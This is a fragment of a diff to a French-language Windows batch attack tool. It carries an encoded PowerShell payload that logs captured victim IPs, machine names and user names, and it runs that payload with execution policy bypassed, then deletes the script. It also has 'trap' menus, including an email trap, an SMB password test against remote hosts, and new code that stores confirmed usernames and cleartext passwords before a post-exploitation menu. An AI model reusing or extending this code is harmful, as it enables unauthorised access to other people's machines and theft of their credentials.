dWxsID0gTmV3LUl0ZW0gJGlwRGlzdGFudCAtSXRlbVR5cGUgRmlsZSAtRm9yY2UgfQogICAgICBpZiAoU2VsZWN0LVN0cmluZyAtUGF0aCAkaXBEaXN0YW50IC1QYXR0ZXJuIChbcmVnZXhdOjpFc2NhcGUoJGlwKSkgLVF1aWV0IC1FQSBTaWxlbnRseUNvbnRpbnVlKSB7CiAgICAgICAgV3JpdGUtSG9zdCAnICAgICAtPiBEZWphIHByZXNlbnRlJyAtRm9yZWdyb3VuZENvbG9yIERhcmtHcmF5CiAgICAgIH0gZWxzZSB7CiAgICAgICAgJGVudHJ5ID0gJ1snICsgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW0nKSArICddIElQOiAnICsgJGlwICsgJyAtLSBQQzogJyArICRwYyArICcgLS0gVXNlcjogJyArICR1c3IKICAgICAgICBBZGQtQ29udGVudCAkaXBEaXN0YW50IC1WYWx1ZSAkZW50cnkgLUVuY29kaW5nIFVURjgKICAgICAgICBXcml0ZS1Ib3N0ICcgICAgIC0+IEFqb3V0ZWUgZGFucyBpcCBkaXN0YW50LnR4dCcgLUZvcmVncm91bmRDb2xvciBDeWFuCiAgICAgIH0KICAgIH0KICB9IGNhdGNoIHsKICAgIFdyaXRlLUhvc3QgKCcgICAgIEVycmV1ciA6ICcgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUZvcmVncm91bmRDb2xvciBSZWQKICB9Cn0KV3JpdGUtSG9zdCAnJwppZiAoJGZvdW5kVG90YWwgLWd0IDApIHsKICBXcml0ZS1Ib3N0ICgnICBbK10gJyArICRmb3VuZFRvdGFsICsgJyBJUChzKSAhIGlwIGRpc3RhbnQudHh0IG1pcyBhIGpvdXIuJykgLUZvcmVncm91bmRDb2xvciBHcmVlbgp9IGVsc2UgewogIFdyaXRlLUhvc3QgJyAgW2ldIEF1Y3VuZSBjYXB0dXJlIGVuIGF0dGVudGUuJyAtRm9yZWdyb3VuZENvbG9yIFllbGxvdwp9CldyaXRlLUhvc3QgJyAgQXBwdXlleiBzdXIgdW5lIHRvdWNoZS4uLicgLUZvcmVncm91bmRDb2xvciBEYXJrR3JheQokbnVsbCA9ICRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoJ05vRWNobyxJbmNsdWRlS2V5RG93bicpCg=='; $t=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); $t=$t.Replace('PATHPLACEHOLDER','%RTRV_DIR%'); [IO.File]::WriteAllText('%PS_RTRV%',$t)"
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_RTRV%"
+if exist "%PS_RTRV%" del /f /q "%PS_RTRV%"
+goto gm_traps_menu
+
+REM --- [5] Email Trap ---
 :gm_email_trap
 cls
 echo.
@@ -2946,14 +2985,15 @@ cls
 echo.
 echo %B%  [MANUEL] TEST MOT DE PASSE - SMB%N%
 echo  Cible : !remote_ip!
-if defined remote_user echo  User  : !remote_user! %Y%[compte capture]%N%
+if defined remote_user if not "!remote_user!"=="inconnu" echo  User  : !remote_user! %Y%[compte capture]%N%
 echo.
 set "smb_host=!remote_ip!"
 set "tmp_v6=!remote_ip::=!"
 if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
 set "man_user=!remote_user!"
+if "!man_user!"=="inconnu" set "man_user="
 if not defined man_user (
-    call :InputWithEsc "  Nom d'utilisateur : " man_user
+    call :InputWithEsc "  Utilisateur : " man_user
     if errorlevel 1 goto wan_menu_nocreds
     if not defined man_user goto wan_menu_nocreds
 ) else (
@@ -3014,6 +3054,32 @@ echo  %G%[+] MOT DE PASSE CORRECT : !man_user! / !man_pass!%N%
 echo.
 set "cred_u=!man_user!"
 set "cred_p=!man_pass!"
+REM --- Mise a jour ip distant.txt avec credentials valides ---
+set "IPDIST_UPD=%~dp0ip distant.txt"
+if exist "!IPDIST_UPD!" (
+    set "UPD_TMP=%TEMP%\ipdist_upd_%RANDOM%.txt"
+    set "UPD_FOUND=0"
+    > "!UPD_TMP!" (
+        for /f "usebackq delims=" %%L in ("!IPDIST_UPD!") do (
+            set "LINE=%%L"
+            echo !LINE! | findstr /C:"IP: !remote_ip!" >nul 2>&1
+            if not errorlevel 1 (
+                set "UPD_FOUND=1"
+                echo [%date% %time%] IP: !remote_ip! -- PC: !remote_pc! -- User: !cred_u! -- Pass: !cred_p!
+            ) else (
+                echo !LINE!
+            )
+        )
+    )
+    if "!UPD_FOUND!"=="1" (
+        move /y "!UPD_TMP!" "!IPDIST_UPD!" >nul
+        echo  %G%[+] ip distant.txt mis a jour avec les credentials%N%
+    ) else (
+        del /f /q "!UPD_TMP!" >nul 2>&1
+        echo [%date% %time%] IP: !remote_ip! -- PC: !remote_pc! -- User: !cred_u! -- Pass: !cred_p! >> "!IPDIST_UPD!"
+        echo  %G%[+] Nouvelle entree ajoutee dans ip distant.txt%N%
+    )
+)
 set "man_user="
 set "man_pass="
 echo  [i] Appuyez sur une touche pour acceder au menu post-exploitation...
